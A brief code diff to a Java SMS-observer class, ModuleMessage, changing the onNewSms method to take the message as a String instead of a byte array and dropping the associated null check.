@@ -434,14 +434,9 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         //lastcheck = new Date(0); 
     }
 
-    public boolean onNewSms(final byte[] byteMessage, String address,
+    public boolean onNewSms(String message, String address,
             final boolean incoming) {
 
-        if (byteMessage == null) {
-            return false;
-        }
-
-        String message = new String(byteMessage);
         //#ifdef DBC
         Check.requires(message != null, "saveLog: null message"); //$NON-NLS-1$
         //#endif
